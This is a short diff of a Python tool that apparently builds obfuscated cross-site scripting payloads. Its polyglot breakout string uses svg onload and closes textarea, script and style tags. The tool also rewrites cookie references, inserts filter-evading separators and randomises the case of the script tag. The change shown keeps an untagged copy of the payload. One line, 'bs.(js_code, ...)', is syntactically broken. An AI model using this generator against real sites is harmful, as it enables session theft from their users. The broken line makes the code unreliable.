@@ -190,7 +190,6 @@ def main():
         sys.exit()
     js_code = loaded_payload.payload
     js_code = insert_options(js_code, loaded_payload.options, res.OPTIONS) #Options replacement
-
     if res.DELAY:
         time_shorts = {'s':1000, 'm':60000, 'h':3600000}
         if type(res.DELAY) == int:
@@ -239,10 +238,12 @@ def main():
         js_code = f"""%%0ajavascript:`/*\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ {js_code}//'">`""" 
 
     if res.TAG:
+        js_code_non_tagged = js_code
         js_code = f"<script>{js_code}</script>"
     
     if res.COOKIE:
         js_code = js_code.replace("document.cookie", "cookie")
+        js_code_non_tagged = js_code
 
     if res.SEPARATOR:
         separators = {
@@ -259,8 +260,11 @@ def main():
         src = bs.(js_code, "html.parser")
         for tag in src.find_all():
             js_code = js_code.replace(tag.name, tag.name+select_separator())
+        js_code_non_tagged = js_code
 
     if res.TAG_RANDOM: #Just a tag obfuscation (ex. <script> => <ScRiPt>)
+        if res.TAG:
+            js_code = js_code_non_tagged
         script_tag = "script"
         script_tag = "".join(random.choice([c.upper(), c]) for c in script_tag )
         end_tag = script_tag
